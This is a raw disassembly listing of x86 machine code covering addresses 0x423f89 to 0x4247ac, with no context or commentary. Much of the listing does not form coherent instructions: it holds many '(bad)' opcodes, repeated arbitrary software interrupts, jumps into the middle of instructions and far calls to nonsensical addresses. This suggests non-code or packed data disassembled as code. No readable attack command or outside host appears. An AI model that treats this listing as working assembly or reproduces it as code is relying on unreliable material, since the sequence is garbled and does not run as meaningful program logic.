  423f89:	rcl    esp,cl
  423f8b:	push   esi
  423f8c:	int    0x76
  423f8e:	mov    ch,cl
  423f90:	lea    ebp,ds:0xcd2d96cd
  423f96:	add    DWORD PTR [ecx],edx
  423f98:	add    DWORD PTR [eax+0x3b0c3b80],0x92ebd399
  423fa2:	shr    edx,cl
  423fa4:	sub    BYTE PTR [ebx+0x13],dl
  423fa7:	jno    0x423f76
  423fa9:	(bad)  
  423faa:	stc    
  423fab:	int    0x96
  423fad:	stc    
  423fae:	cmp    ecx,DWORD PTR [ebx+edi*1]
  423fb1:	cdq    
  423fb2:	shr    ebx,cl
  423fb4:	xchg   edx,eax
  423fb5:	shr    edx,cl
  423fb7:	sub    BYTE PTR [ebx+0x13],dl
  423fba:	jno    0x423fbc
  423fbc:	(bad)  
  423fbd:	jne    0x423fbf
  423fbf:	jo     0x423fdd
  423fc1:	stos   BYTE PTR es:[edi],al
  423fc2:	test   al,0x63
  423fc4:	retf   
  423fc5:	ror    BYTE PTR [eax-0x12326980],cl
  423fcb:	add    al,0xed
  423fcd:	and    al,0x98
  423fcf:	int    0x11
  423fd1:	int    0x12
  423fd3:	sub    eax,0x4808081
  423fd8:	pop    esp
  423fd9:	sub    BYTE PTR [edi],0x5
  423fdc:	dec    edx
  423fdd:	add    DWORD PTR [eax+0x2fda0680],0x80819205
  423fe7:	add    BYTE PTR [esi],0xf7
  423fea:	das    
  423feb:	add    eax,0x80808003
  423ff0:	int    0x7
  423ff2:	or     DWORD PTR [eax+0x6d068080],eax
  423ff8:	das    
  423ff9:	add    eax,0x808080e9
  423ffe:	add    al,0x69
  424000:	int3   
  424001:	add    BYTE PTR [eax+0x52f3080],0xe2
  424008:	add    BYTE PTR [eax+0x54985e80],0x2f
  42400f:	add    eax,0x808080e3
  424014:	int    0xc1
  424016:	and    eax,0x4808081
  42401b:	mov    dh,0x11
  42401d:	or     ch,0x13
  424020:	xor    ecx,DWORD PTR [esi-0x79]
  424023:	shr    BYTE PTR [edi],cl
  424025:	mov    ebx,0x8d0a4c70
  42402a:	mov    ch,0x2f
  42402c:	mov    ebx,0x13874e7c
  424031:	das    
  424032:	add    eax,0x80808049
  424037:	iret   
  424038:	jl     0x42404e
  42403a:	pop    ebx
  42403b:	or     cl,BYTE PTR [ebp+0x69bd]
  424041:	add    BYTE PTR [ebx-0x2baef966],al
  424047:	or     ebp,0x31
  42404a:	add    al,0xb6
  42404c:	cmc    
  42404d:	sub    BYTE PTR [ebx],0x99
  424050:	xchg   ecx,esi
  424052:	das    
  424053:	mov    ebx,0xbb2f4ee0
  424058:	mov    al,ds:0xd4fc874c
  42405d:	mov    esi,0xa148acf
  424062:	(bad)  
  424063:	in     eax,dx
  424064:	push   es
  424065:	push   ecx
  424066:	aam    0x6e
  424068:	int    0x89
  42406a:	add    al,0xb6
  42406c:	stc    
  42406d:	sub    BYTE PTR [ebx],0xf
  424070:	xchg   DWORD PTR [ebp+0x2f],edi
  424073:	mov    ebx,0xbb2f4ede
  424078:	sahf   
  424079:	dec    esp
  42407a:	xchg   esp,edi
  42407c:	aam    0x33
  42407e:	iret   
  42407f:	ficom  WORD PTR [edx+ecx*1]
  424082:	out    0xfd,al
  424084:	int    0xe6
  424086:	std    
  424087:	int    0x6a
  424089:	push   es
  42408a:	add    ah,dl
  42408c:	xchg   ch,cl
  42408e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42408f:	mov    ch,0x81
  424091:	and    al,0x8b
  424093:	das    
  424094:	mov    ebx,0xbb2f4ede
  424099:	sahf   
  42409a:	dec    esp
  42409b:	add    BYTE PTR [esi-0x7],dh
  42409e:	add    al,0x76
  4240a0:	std    
  4240a1:	mov    BYTE PTR [edi-0x619a104],al
  4240a7:	sbb    ch,0x2f
  4240aa:	mov    ebx,0xbb2f4ee0
  4240af:	mov    al,ds:0xed8dcd4c
  4240b4:	add    BYTE PTR [esi-0xb],dh
  4240b7:	add    al,0xd3
  4240b9:	mov    BYTE PTR [edi-0x1272f504],al
  4240bf:	pop    esi
  4240c0:	out    0xf5,al
  4240c2:	sub    BYTE PTR ds:0x2fbd8dcd,0xbb
  4240c9:	jo     0x424119
  4240cb:	das    
  4240cc:	mov    ebx,0x76004cdc
  4240d1:	adc    DWORD PTR [ebx+edx*8],eax
  4240d4:	mov    BYTE PTR [edi-0x4272f527],al
  4240da:	pop    esi
  4240db:	xchg   esi,eax
  4240dc:	adc    DWORD PTR [edi],ebp
  4240de:	or     ebp,DWORD PTR [esi-0x56000000]
  4240e4:	arpl   WORD PTR [ebx],di
  4240e6:	ins    DWORD PTR es:[edi],dx
  4240e7:	ins    BYTE PTR es:[edi],dx
  4240e8:	in     al,dx
  4240e9:	xchg   edx,eax
  4240ea:	cmp    ebp,DWORD PTR [ebp-0x58]
  4240ed:	retf   
  4240ee:	lds    edx,FWORD PTR [esi+0xacdedcd]
  4240f4:	sub    eax,0xcd808081
  4240f9:	jbe    0x424147
  4240fb:	add    al,0xed
  4240fd:	xor    BYTE PTR [ebx+0x3b],bl
  424100:	fstp   QWORD PTR [eax+0x2f1e5e9a]
  424106:	add    eax,0x8080800b
  42410b:	inc    ebx
  42410c:	(bad)
  42410f:	pop    esi
  424110:	pushf  
  424111:	(bad)  
  424113:	test   DWORD PTR [ebx],edi
  424115:	ins    DWORD PTR es:[edi],dx
  424116:	ins    BYTE PTR es:[edi],dx
  424117:	in     al,dx
  424118:	fmul   st,st(5)
  42411a:	ins    BYTE PTR es:[edi],dx
  42411b:	fadd   QWORD PTR [edi+0x7ccd8876]
  424121:	and    al,0xcd
  424123:	jo     0x424159
  424125:	int    0x90
  424127:	adc    al,0xcd
  424129:	fcomp  QWORD PTR [edi+eax*4]
  42412c:	lea    ecx,[eax+0xa889687]
  424132:	(bad)  
  424133:	std    
  424134:	inc    ebx
  424135:	clc    
  424136:	jnp    0x4240bf
  424138:	or     ah,dh
  42413a:	std    
  42413b:	or     ah,BYTE PTR [esi-0x259a107]
  424141:	fsub   st,st(3)
  424143:	inc    ebx
  424144:	pushf  
  424145:	adc    al,0x77
  424147:	xchg   BYTE PTR [edi],ch
  424149:	mov    ebx,0x92eca054
  42414e:	int    0xf4
  424150:	iret   
  424151:	push   esp
  424152:	ror    ebp,0x68
  424155:	push   es
  424156:	add    ah,dl
  424158:	ds xchg esi,esp
  42415b:	mov    BYTE PTR [edx],cl
  42415d:	out    0x11,al
  42415f:	inc    ebx
  424160:	stc    
  424161:	fdiv   DWORD PTR [eax]
  424163:	int    0xa6
  424165:	dec    esp
  424166:	int    0x63
  424168:	in     al,0x87
  42416a:	popf   
  42416b:	inc    ebx
  42416c:	cld    
  42416d:	ja     0x4240f3
  42416f:	int    0x58
  424171:	in     al,dx
  424172:	mov    BYTE PTR [ebx],dh
  424174:	out    0x88,al
  424176:	or     ch,BYTE PTR [eax-0x33]
  424179:	(bad)  
  42417a:	adc    DWORD PTR [esi],eax
  42417c:	not    esp
  42417e:	dec    esi
  42417f:	int    0xa6
  424181:	stc    
  424182:	dec    ebx
  424183:	or     ah,BYTE PTR [esi-0x259bc07]
  424189:	sbb    BYTE PTR [ebp-0x14],0x8
  42418d:	cmp    ebp,DWORD PTR [ebp-0x56]
  424190:	test   al,0x63
  424192:	retf   
  424193:	ror    BYTE PTR [eax-0x12326980],cl
  424199:	add    al,0xed
  42419b:	push   eax
  42419c:	pop    ebx
  42419d:	cwde   
  42419e:	pop    ebp
  42419f:	dec    ecx
  4241a0:	and    DWORD PTR [esi-0x289f5cb],eax
  4241a6:	leave  
  4241a7:	jbe    0x4241a2
  4241a9:	inc    ecx
  4241aa:	and    DWORD PTR [esi-0x27232cb],eax
  4241b0:	int    0xa6
  4241b2:	std    
  4241b3:	call   0x3b81:0x90cfffc0
  4241ba:	psrlq  mm5,mm3
  4241bd:	xchg   edx,eax
  4241be:	stos   BYTE PTR es:[edi],al
  4241bf:	cmp    esp,ecx
  4241c1:	shl    ebp,cl
  4241c3:	sub    BYTE PTR [ebx+0xc],dl
  4241c6:	or     cl,BYTE PTR [ebp-0x2723243]
  4241cc:	int    0x8d
  4241ce:	std    
  4241cf:	int    0x8d
  4241d1:	std    
  4241d2:	int    0x8d
  4241d4:	std    
  4241d5:	int    0x8d
  4241d7:	std    
  4241d8:	int    0x8d
  4241da:	std    
  4241db:	int    0x8d
  4241dd:	std    
  4241de:	int    0x8d
  4241e0:	std    
  4241e1:	int    0x8d
  4241e3:	std    
  4241e4:	int    0x8d
  4241e6:	std    
  4241e7:	leave  
  4241e8:	jbe    0x4241fb
  4241ea:	fadd   st,st(5)
  4241ec:	loope  0x424243
  4241ee:	int    0x8d
  4241f0:	std    
  4241f1:	int    0xa6
  4241f3:	std    
  4241f4:	cmp    esp,ecx
  4241f6:	cmp    ecx,DWORD PTR [edi]
  4241f8:	shl    ebp,cl
  4241fa:	sub    bl,dl
  4241fc:	jmp    0x424190
  4241fe:	push   ebx
  4241ff:	or     al,0xcd
  424201:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424202:	dec    esp
  424203:	int    0x9f
  424205:	sub    eax,0x43808081
  42420a:	push   ebx
  42420b:	das    
  42420c:	add    eax,0x80808717
  424211:	int    0x8d
  424213:	std    
  424214:	int    0xa6
  424216:	std    
  424217:	cmp    ecx,DWORD PTR [edi]
  424219:	cmp    esp,ecx
  42421b:	shr    ebx,cl
  42421d:	xchg   edx,eax
  42421e:	shl    ebp,cl
  424220:	sub    BYTE PTR [ebx+0xc],dl
  424223:	inc    ebx
  424224:	adc    ebp,DWORD PTR [edi]
  424226:	add    eax,0x8080877f
  42422b:	int    0xca
  42422d:	add    DWORD PTR [eax-0x69327f80],eax
  424233:	std    
  424234:	int    0xa6
  424236:	std    
  424237:	cmp    ebx,DWORD PTR [ecx-0xc2c1ec5]
  42423d:	xchg   edx,eax
  42423e:	shl    ebp,cl
  424240:	sub    BYTE PTR [ebx-0x2b],dl
  424243:	inc    ebx
  424244:	adc    ebp,DWORD PTR [edi]
  424246:	add    eax,0x8080875b
  42424b:	xchg   DWORD PTR [ebp-0xe72f578],ecx
  424251:	int    0xf1
  424253:	cmp    ebx,DWORD PTR [ecx-0x1ec46233]
  424259:	shl    ebx,cl
  42425b:	xchg   edx,eax
  42425c:	shl    ebp,cl
  42425e:	sub    BYTE PTR [ebx-0x2b],dl
  424261:	or     dl,BYTE PTR [esi+0x1196cd11]
  424267:	inc    ebx
  424268:	icebp  
  424269:	aam    0x26
  42426b:	int    0x76
  42426d:	std    
  42426e:	int    0x96
  424270:	std    
  424271:	cmp    ebx,ecx
  424273:	cmp    edi,DWORD PTR [ecx-0x2d]
  424276:	jmp    0xd253:0x92bdd328
  42427d:	int    0x96
  42427f:	adc    DWORD PTR [ebx-0x26],esi
  424282:	adc    al,0x5e
  424284:	test   BYTE PTR [edx-0x2a],cl
  424287:	xor    cl,ch
  424289:	jbe    0x424288
  42428b:	int    0x96
  42428d:	std    
  42428e:	cmp    ebx,ecx
  424290:	cmp    edi,DWORD PTR [ecx-0x2d]
  424293:	jmp    0xd253:0x92bdd328
  42429a:	int    0x96
  42429c:	adc    DWORD PTR [ebx-0x26],esi
  42429f:	adc    al,0x5e
  4242a1:	je     0x4242ed
  4242a3:	xor    BYTE PTR [edi],ch
  4242a5:	add    eax,0x808092df
  4242aa:	int    0x76
  4242ac:	std    
  4242ad:	int    0x76
  4242af:	std    
  4242b0:	int    0xa6
  4242b2:	std    
  4242b3:	int    0x76
  4242b5:	std    
  4242b6:	cmp    ecx,ecx
  4242b8:	cmp    ebp,DWORD PTR [ecx-0x2cd7522d]
  4242be:	in     al,dx
  4242bf:	xchg   edx,eax
  4242c0:	push   ebx
  4242c1:	popf   
  4242c2:	int    0x76
  4242c4:	adc    DWORD PTR [ebx+0x6d],esi
  4242c7:	adc    al,0x87
  4242c9:	ror    ebp,cl
  4242cb:	jl     0x4242fd
  4242cd:	xchg   DWORD PTR [ebp-0x5272f578],ecx
  4242d3:	int    0x8d
  4242d5:	std    
  4242d6:	int    0x96
  4242d8:	std    
  4242d9:	cmp    ecx,DWORD PTR [edi]
  4242db:	cmp    ebx,ecx
  4242dd:	shr    ebx,cl
  4242df:	xchg   edx,eax
  4242e0:	shr    edx,cl
  4242e2:	sub    BYTE PTR [ebx+0x13],dl
  4242e5:	int    0x96
  4242e7:	std    
  4242e8:	or     cl,BYTE PTR [ebp+0xa88cd95]
  4242ee:	lea    esi,[ebp+0x3bfd8dcd]
  4242f4:	cdq    
  4242f5:	cmp    esi,eax
  4242f7:	shl    edx,cl
  4242f9:	sub    bl,dl
  4242fb:	repz xchg edx,eax
  4242fd:	push   ebx
  4242fe:	jecxz  0x4242cd
  424300:	lea    esi,[ebp-0x792becbd]
  424306:	xchg   DWORD PTR [ebp-0x6a72f578],ecx
  42430c:	int    0x8d
  42430e:	std    
  42430f:	int    0x96
  424311:	std    
  424312:	cmp    ecx,DWORD PTR [edi]
  424314:	cmp    ebx,ecx
  424316:	shr    ebx,cl
  424318:	xchg   edx,eax
  424319:	shr    edx,cl
  42431b:	sub    BYTE PTR [ebx+0x13],dl
  42431e:	xchg   DWORD PTR [esp+ecx*2-0x37],edi
  424322:	jbe    0x4242c1
  424324:	popa   
  424325:	and    DWORD PTR [esi-0x777278cb],eax
  42432b:	or     cl,BYTE PTR [ebp-0x32781313]
  424331:	(bad)  
  424332:	in     eax,dx
  424333:	int    0x76
  424335:	dec    esp
  424336:	int    0x1
  424338:	adc    DWORD PTR [ecx+0x718080],eax
  42433e:	xor    ch,cl
  424340:	jbe    0x42438e
  424342:	add    dh,dl
  424344:	in     eax,dx
  424345:	int    0x1
  424347:	adc    DWORD PTR [ecx+0x70008080],eax
  42434d:	dec    esp
  42434e:	leave  
  42434f:	jbe    0x4242f6
  424351:	pop    DWORD PTR [ebp*1-0x5a89368a]
  424358:	dec    edx
  424359:	pop    ss
  42435a:	xchg   BYTE PTR ds:0xcdfd8dcd,dh
  424360:	xchg   esi,eax
  424361:	std    
  424362:	cmp    ecx,DWORD PTR [edi]
  424364:	cmp    ebx,ecx
  424366:	shr    ebx,cl
  424368:	xchg   edx,eax
  424369:	shr    edx,cl
  42436b:	sub    BYTE PTR [ebx+0x13],dl
  42436e:	or     dh,BYTE PTR [esi-0x4b]
  424371:	inc    ebx
  424372:	jge    0x42434a
  424374:	pop    eax
  424375:	int    0x76
  424377:	stc    
  424378:	int    0x8d
  42437a:	stc    
  42437b:	cmp    edi,DWORD PTR [ecx+0x3b]
  42437e:	lock shl edx,cl
  424381:	sub    bl,dl
  424383:	mov    ebp,0xcdd35392
  424388:	lea    esp,[ebp+0x3ba596cd]
  42438e:	fnstcw WORD PTR [ebx]
  424390:	psrlq  mm5,mm2
  424393:	sub    BYTE PTR [edi+0x4c76cd9d],al
  424399:	int    0x1
  42439b:	adc    DWORD PTR [ecx-0x142c7f80],eax
  4243a1:	xchg   edx,eax
  4243a2:	push   ebx
  4243a3:	jecxz  0x4243d4
  4243a5:	rcl    ebp,1
  4243a7:	bound  eax,QWORD PTR [eax]
  4243a9:	jo     0x4243df
  4243ab:	int    0x76
  4243ad:	std    
  4243ae:	int    0x8d
  4243b0:	std    
  4243b1:	cmp    edi,DWORD PTR [ecx+0x3b]
  4243b4:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4243bb:	push   ebx
  4243bc:	rol    DWORD PTR [ebx+0x76],cl
  4243bf:	mov    ch,0xd6
  4243c1:	and    ch,cl
  4243c3:	jbe    0x424362
  4243c5:	int    0x8d
  4243c7:	popf   
  4243c8:	cmp    esi,eax
  4243ca:	cmp    edi,DWORD PTR [ecx-0x2d]
  4243cd:	mov    ebp,0x28f2d392
  4243d2:	push   ebx
  4243d3:	jge    0x424418
  4243d5:	fld    TBYTE PTR [edi]
  4243d7:	pop    es
  4243d8:	xchg   esp,eax
  4243d9:	add    BYTE PTR [eax],al
  4243db:	add    ch,cl
  4243dd:	jbe    0x4243dc
  4243df:	int    0x8d
  4243e1:	std    
  4243e2:	cmp    edi,DWORD PTR [ecx+0x3b]
  4243e5:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4243ec:	push   ebx
  4243ed:	rol    DWORD PTR [ebx+0x76],cl
  4243f0:	mov    ch,0xd6
  4243f2:	and    ch,cl
  4243f4:	jbe    0x4243ef
  4243f6:	int    0x8d
  4243f8:	stc    
  4243f9:	cmp    edi,DWORD PTR [ecx+0x3b]
  4243fc:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  424403:	push   ebx
  424404:	rol    DWORD PTR [ecx-0x5f14428a],cl
  42440a:	add    DWORD PTR [eax-0x12893680],0x67f1048e
  424414:	leave  
  424415:	jbe    0x42440c
  424417:	fdivr  st,st(4)
  424419:	sbb    al,0xb
  42441b:	int    0xa6
  42441d:	std    
  42441e:	int    0x76
  424420:	std    
  424421:	cmp    ebp,DWORD PTR [ecx-0x132c36c5]
  424427:	xchg   edx,eax
  424428:	shr    DWORD PTR [ebp-0x1462acd8],cl
  42442e:	sbb    al,BYTE PTR [ecx+0x76cd8080]
  424434:	std    
  424435:	int    0x8d
  424437:	std    
  424438:	cmp    edi,DWORD PTR [ecx+0x3b]
  42443b:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  424442:	push   ebx
  424443:	ror    DWORD PTR [edx],cl
  424445:	jbe    0x424434
  424447:	int    0x76
  424449:	std    
  42444a:	int    0x8d
  42444c:	std    
  42444d:	cmp    edi,DWORD PTR [ecx+0x3b]
  424450:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  424457:	push   ebx
  424458:	ror    DWORD PTR [edx],cl
  42445a:	jbe    0x424451
  42445c:	int    0x8d
  42445e:	std    
  42445f:	int    0x76
  424461:	std    
  424462:	cmp    ecx,DWORD PTR [edi]
  424464:	cmp    ecx,ecx
  424466:	shr    DWORD PTR [ebp-0x6d142cd8],cl
  42446c:	push   ebx
  42446d:	jge    0x42443c
  42446f:	jbe    0x424406
  424471:	inc    ebx
  424472:	jge    0x424448
  424474:	xchg   ch,cl
  424476:	test   BYTE PTR ds:0xcded760a,bl
  42447c:	jbe    0x42442b
  42447e:	int    0x84
  424480:	sbb    eax,0xcdf5760a
  424485:	jbe    0x424484
  424487:	int    0x8d
  424489:	std    
  42448a:	cmp    edi,DWORD PTR [ecx+0x3b]
  42448d:	lock shl edx,cl
  424490:	sub    bl,dl
  424492:	mov    ebp,0xcdd35392
  424497:	(bad)  
  424498:	in     eax,dx
  424499:	inc    ebx
  42449a:	rcl    esp,cl
  42449c:	push   esp
  42449d:	int    0x76
  42449f:	std    
  4244a0:	int    0x8d
  4244a2:	std    
  4244a3:	cmp    esi,eax
  4244a5:	cmp    edi,DWORD PTR [ecx-0x2d]
  4244a8:	repnz sub bl,dl
  4244ab:	mov    ebp,0xcdd35392
  4244b0:	(bad)  
  4244b1:	in     eax,dx
  4244b2:	shr    ebx,cl
  4244b4:	sub    al,BYTE PTR [ebx-0x2d]
  4244b7:	aam    0x1c
  4244b9:	int    0x8d
  4244bb:	in     eax,dx
  4244bc:	int    0x76
  4244be:	dec    esp
  4244bf:	int    0x1
  4244c1:	adc    DWORD PTR [ecx-0x44d07f80],eax
  4244c7:	retf   
  4244c8:	jno    0x4244ca
  4244ca:	(bad)  
  4244cb:	mov    ch,0x0
  4244cd:	jo     0x424457
  4244cf:	in     al,dx
  4244d0:	push   ds
  4244d1:	int    0x76
  4244d3:	cmc    
  4244d4:	xchg   DWORD PTR [esi-0x78],esi
  4244d7:	int    0x8d
  4244d9:	dec    esp
  4244da:	int    0xa
  4244dc:	adc    DWORD PTR [ecx+0x6d048080],eax
  4244e2:	xchg   edx,eax
  4244e3:	jo     0x4244e5
  4244e5:	(bad)  
  4244e6:	mov    ch,0x0
  4244e8:	jno    0x424472
  4244ea:	or     dh,BYTE PTR [esi-0xb]
  4244ed:	int    0x76
  4244ef:	std    
  4244f0:	int    0x8d
  4244f2:	std    
  4244f3:	cmp    edi,DWORD PTR [ecx+0x3b]
  4244f6:	lock shl edx,cl
  4244f9:	sub    bl,dl
  4244fb:	mov    ebp,0xcdd35392
  424500:	(bad)  
  424501:	cmc    
  424502:	inc    ebx
  424503:	ror    ebp,cl
  424505:	jbe    0x424500
  424507:	int    0x8d
  424509:	stc    
  42450a:	(bad)  
  42450b:	xor    DWORD PTR [ebx],edi
  42450d:	jns    0x42454a
  42450f:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  424516:	push   ebx
  424517:	rol    DWORD PTR [ecx+0x1cecbd76],cl
  42451d:	cmp    esi,eax
  42451f:	cmp    edi,DWORD PTR [ecx-0x2d]
  424522:	repnz sub bl,dl
  424525:	mov    ebp,0xcdd35392
  42452a:	(bad)  
  42452b:	cmc    
  42452c:	das    
  42452d:	rcl    ebx,1
  42452f:	int    0x8d
  424531:	lods   eax,DWORD PTR ds:[esi]
  424532:	or     al,BYTE PTR [edi+ebx*1-0x32068933]
  424539:	(bad)  
  42453a:	stc    
  42453b:	cmp    edi,DWORD PTR [ecx+0x3b]
  42453e:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  424545:	push   ebx
  424546:	rol    DWORD PTR [edi-0x2893263],cl
  42454c:	int    0x8d
  42454e:	std    
  42454f:	cmp    esi,eax
  424551:	cmp    edi,DWORD PTR [ecx-0x2d]
  424554:	repnz sub bl,dl
  424557:	mov    ebp,0xcdd35392
  42455c:	lea    ebp,[ebp+0x2f1f845e]
  424562:	push   es
  424563:	or     al,0xff
  424565:	add    BYTE PTR [eax],al
  424567:	int    0x76
  424569:	adc    ebp,ecx
  42456b:	lea    edx,[ecx]
  42456d:	ins    BYTE PTR es:[edi],dx
  42456e:	sar    DWORD PTR [ebp-0x30b330d8],cl
  424574:	test   BYTE PTR [eax-0x2cac7f80],al
  42457a:	int    0x8d
  42457c:	icebp  
  42457d:	push   esi
  42457e:	dec    ecx
  42457f:	and    DWORD PTR [esi-0x2ec14cb],eax
  424585:	add    BYTE PTR [eax],al
  424587:	int    0x76
  424589:	std    
  42458a:	int    0x8d
  42458c:	std    
  42458d:	cmp    edi,DWORD PTR [ecx+0x3b]
  424590:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  424597:	push   ebx
  424598:	rcr    DWORD PTR [esi+0x76],cl
  42459b:	mov    ebp,0x76cd88d6
  4245a0:	stc    
  4245a1:	int    0x8d
  4245a3:	stc    
  4245a4:	in     al,dx
  4245a5:	xchg   ch,cl
  4245a7:	jbe    0x4245a6
  4245a9:	int    0x8d
  4245ab:	std    
  4245ac:	cmp    esi,eax
  4245ae:	cmp    edi,DWORD PTR [ecx-0x56]
  4245b1:	shl    edx,cl
  4245b3:	sub    bl,dl
  4245b5:	mov    ebp,0xd353a892
  4245ba:	arpl   bx,cx
  4245bc:	ror    BYTE PTR [eax-0x12326980],cl
  4245c2:	add    al,0xed
  4245c4:	xor    al,0xc9
  4245c6:	jbe    0x4245c5
  4245c8:	dec    ecx
  4245c9:	and    DWORD PTR [esi-0x528936cb],eax
  4245cf:	inc    ecx
  4245d0:	and    DWORD PTR [esi+0x4c76cd35],eax
  4245d6:	or     dh,BYTE PTR [esi+0x4c]
  4245d9:	cwde   
  4245da:	int    0x6d
  4245dc:	int    0x76
  4245de:	std    
  4245df:	int    0x96
  4245e1:	std    
  4245e2:	sar    bh,0x5f
  4245e5:	shl    DWORD PTR [ecx],1
  4245e7:	xchg   BYTE PTR ds:0x3ba8d33b,dh
  4245ed:	cdq    
  4245ee:	shr    edx,cl
  4245f0:	sub    bl,dl
  4245f2:	mov    ebp,0xcdd25392
  4245f7:	xchg   esi,eax
  4245f8:	mov    BYTE PTR [ebx-0xf],al
  4245fb:	das    
  4245fc:	add    eax,0x80808159
  424601:	int    0x76
  424603:	mov    ch,cl
  424605:	xchg   esi,eax
  424606:	mov    BYTE PTR [edi+0xa9a6470],al
  42460c:	xchg   esi,eax
  42460d:	cmc    
  42460e:	leave  
  42460f:	jbe    0x42460a
  424611:	popa   
  424612:	and    DWORD PTR [esi-0x68932cb],eax
  424618:	int    0x96
  42461a:	stc    
  42461b:	cmp    ebx,DWORD PTR [ecx+0x3b28ead3]
  424621:	rcl    ebx,cl
  424623:	mov    ebp,0xcdd25392
  424628:	xchg   esi,eax
  424629:	std    
  42462a:	int    0xe6
  42462c:	std    
  42462d:	cmp    esp,ebx
  42462f:	cmp    edi,edi
  424631:	shr    ecx,cl
  424633:	sub    bl,dl
  424635:	repz xchg edx,eax
  424637:	push   ebx
  424638:	fxch   st(5)
  42463a:	out    0xf5,al
  42463c:	pop    esi
  42463d:	xchg   esp,eax
  42463e:	leave  
  42463f:	fsubr  QWORD PTR [edi]
  424641:	add    eax,0x8080816b
  424646:	int    0x96
  424648:	cmc    
  424649:	int    0x76
  42464b:	mov    BYTE PTR [edi-0x7f7fd2f5],al
  424651:	or     ch,0x96
  424654:	mov    ch,cl
  424656:	out    0xf5,al
  424658:	xor    ebx,DWORD PTR [edx-0x21932ac]
  42465e:	pop    ebx
  42465f:	int    0xa6
  424661:	std    
  424662:	cmp    edi,edx
  424664:	cmp    ebp,DWORD PTR [ecx-0x2c6def2d]
  42466a:	in     eax,0x28
  42466c:	push   ebx
  42466d:	cld    
  42466e:	or     dl,BYTE PTR [esi+0x2fd943a5]
  424674:	add    eax,0x8080814f
  424679:	int    0x96
  42467b:	std    
  42467c:	int    0xe6
  42467e:	std    
  42467f:	cmp    esp,ebx
  424681:	cmp    edi,edi
  424683:	shl    ebx,cl
  424685:	xchg   edx,eax
  424686:	shr    ecx,cl
  424688:	sub    BYTE PTR [ebx-0x27],dl
  42468b:	or     dl,BYTE PTR [esi+0x4c76c911]
  424691:	mov    dl,0x21
  424693:	xchg   BYTE PTR ds:0xcdfd96cd,dh
  424699:	out    0xfd,al
  42469b:	cmp    esp,ebx
  42469d:	cmp    edi,edi
  42469f:	shl    ebx,cl
  4246a1:	xchg   edx,eax
  4246a2:	shr    ecx,cl
  4246a4:	sub    BYTE PTR [ebx-0x27],dl
  4246a7:	jmp    0x4246ab
  4246a9:	add    BYTE PTR [eax-0x2693280],0xcd
  4246b0:	(bad)  
  4246b1:	std    
  4246b2:	add    al,0xf7
  4246b4:	(bad)  
  4246b5:	cmp    esp,ebx
  4246b7:	sar    DWORD PTR [ecx-0x6d0c2cd8],cl
  4246bd:	push   ebx
  4246be:	cdq    
  4246bf:	iret   
  4246c0:	ja     0x4246bb
  4246c2:	jecxz  0x4246b3
  4246c4:	inc    ebx
  4246c5:	cdq    
  4246c6:	das    
  4246c7:	add    al,0x21
  4246c9:	add    BYTE PTR [eax-0x3004cc80],0xe4
  4246d0:	jo     0x42465a
  4246d2:	or     dl,dh
  4246d4:	mov    ch,0x2f
  4246d6:	mov    ebx,0xea121a
  4246db:	das    
  4246dc:	add    BYTE PTR [eax-0x321269f6],0x96
  4246e3:	in     eax,dx
  4246e4:	xchg   DWORD PTR [eax],esi
  4246e6:	int    0xd6
  4246e8:	in     eax,dx
  4246e9:	xchg   DWORD PTR [eax-0x2d],edx
  4246ec:	repz sub bl,dl
  4246ef:	mov    ecx,0x2ffb5392
  4246f4:	mov    ebx,0x4cf3d31a
  4246f9:	adc    dh,bh
  4246fb:	dec    ecx
  4246fc:	and    DWORD PTR [esi-0x1229f5cb],eax
  424702:	or     dl,BYTE PTR [esi-0x12693243]
  424708:	int    0xd6
  42470a:	in     eax,dx
  42470b:	cmp    esp,ebx
  42470d:	add    al,0xf7
  42470f:	call   ebx
  424711:	repz xchg edx,eax
  424713:	sar    DWORD PTR [ecx-0x7866acd8],cl
  424719:	xchg   esi,eax
  42471a:	mov    BYTE PTR [edx],cl
  42471c:	xchg   esi,eax
  42471d:	in     eax,dx
  42471e:	int    0x96
  424720:	dec    esp
  424721:	int    0xd6
  424723:	dec    esp
  424724:	cmp    esp,ebx
  424726:	add    al,0xf7
  424728:	call   ebx
  42472a:	mov    ecx,0x92f3d328
  42472f:	push   ebx
  424730:	cdq    
  424731:	int    0xd6
  424733:	mov    ebp,0x32d6fb43
  424738:	int    0x96
  42473a:	dec    esp
  42473b:	int    0xd6
  42473d:	dec    esp
  42473e:	cmp    esp,ebx
  424740:	add    al,0xf7
  424742:	call   ebx
  424744:	mov    ecx,0x92f3d328
  424749:	push   ebx
  42474a:	cdq    
  42474b:	int    0xd6
  42474d:	mov    ebp,0x88d6fb43
  424752:	int    0x96
  424754:	in     eax,dx
  424755:	int    0xd6
  424757:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  424758:	add    DWORD PTR [edx+0x4],0x8d0092c9
  42475f:	mov    ch,0x2f
  424761:	push   es
  424762:	xchg   ebx,eax
  424763:	add    BYTE PTR [eax],al
  424765:	add    BYTE PTR [ecx-0x6932ee5a],al
  42476b:	stc    
  42476c:	int    0xd6
  42476e:	stc    
  42476f:	cmp    esp,ebx
  424771:	add    al,0xf7
  424773:	call   ebx
  424775:	mov    ecx,0x92f3d328
  42477a:	push   ebx
  42477b:	cdq    
  42477c:	int    0xd6
  42477e:	adc    ebp,ecx
  424780:	out    0xf5,al
  424782:	inc    ebx
  424783:	aam    0xd9
  424785:	in     al,0x77
  424787:	sub    al,0xcd
  424789:	xchg   esi,eax
  42478a:	std    
  42478b:	int    0xd6
  42478d:	std    
  42478e:	cmp    esp,ebx
  424790:	add    al,0xf7
  424792:	call   ebx
  424794:	repz xchg edx,eax
  424796:	sar    DWORD PTR [ecx+0x53c58728],cl
  42479c:	cdq    
  42479d:	int    0x9c
  42479f:	test   BYTE PTR [ebx-0x1e],al
  4247a2:	das    
  4247a3:	push   es
  4247a4:	test   BYTE PTR [eax],al
  4247a6:	add    BYTE PTR [eax],al
  4247a8:	arpl   bp,cx
  4247aa:	jbe    0x424759
  4247ac:	cmp    edx,ebx
